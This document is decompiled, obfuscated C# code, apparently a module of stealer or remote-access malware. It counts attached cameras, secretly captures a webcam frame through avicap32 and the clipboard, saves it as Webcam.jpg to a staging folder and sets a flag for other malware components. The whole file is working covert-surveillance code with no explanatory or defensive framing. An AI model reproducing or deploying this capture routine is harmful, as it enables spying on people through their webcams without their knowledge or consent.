using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.Management;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;
using ns13;

namespace ns5;

internal sealed class Class22
{
	private static IntPtr intptr_0;

	private static int int_0 = 3000;

	[DllImport("avicap32.dll")]
	public static extern IntPtr capCreateCaptureWindowA(string string_0, int int_1, int int_2, int int_3, int int_4, int int_5, int int_6, int int_7);

	[DllImport("user32")]
	public static extern int SendMessage(IntPtr intptr_1, uint uint_0, int int_1, int int_2);

	private static int smethod_0()
	{
		//IL_0007: Unknown result type (might be due to invalid IL or missing references)
		//IL_000d: Expected O, but got Unknown
		int num = 0;
		try
		{
			ManagementObjectSearcher val = new ManagementObjectSearcher("SELECT * FROM Win32_PnPEntity WHERE (PNPClass = 'Image' OR PNPClass = 'Camera')");
			try
			{
				ManagementObjectEnumerator enumerator = val.Get().GetEnumerator();
				try
				{
					while (enumerator.MoveNext())
					{
						enumerator.get_Current();
						num++;
					}
					return num;
				}
				finally
				{
					((IDisposable)enumerator)?.Dispose();
				}
			}
			finally
			{
				((IDisposable)val)?.Dispose();
			}
		}
		catch
		{
			Console.WriteLine("GetConnectedCamerasCount : Query failed");
			return num;
		}
	}

	public static bool smethod_1(string string_0)
	{
		//IL_00a1: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ab: Unknown result type (might be due to invalid IL or missing references)
		if (smethod_0() != 1)
		{
			return false;
		}
		try
		{
			Clipboard.Clear();
			intptr_0 = capCreateCaptureWindowA("WebCap", 0, 0, 0, 320, 240, 0, 0);
			SendMessage(intptr_0, 1034u, 0, 0);
			SendMessage(intptr_0, 1074u, 0, 0);
			Thread.Sleep(int_0);
			SendMessage(intptr_0, 1084u, 0, 0);
			SendMessage(intptr_0, 1054u, 0, 0);
			SendMessage(intptr_0, 1035u, 0, 0);
			Image val = (Image)Clipboard.GetDataObject().GetData(DataFormats.Bitmap);
			Clipboard.Clear();
			val.Save(string_0 + "\\Webcam.jpg", ImageFormat.get_Jpeg());
			val.Dispose();
			Class54.bool_6 = true;
		}
		catch (Exception value)
		{
			Console.WriteLine(value);
			return false;
		}
		return true;
	}
}
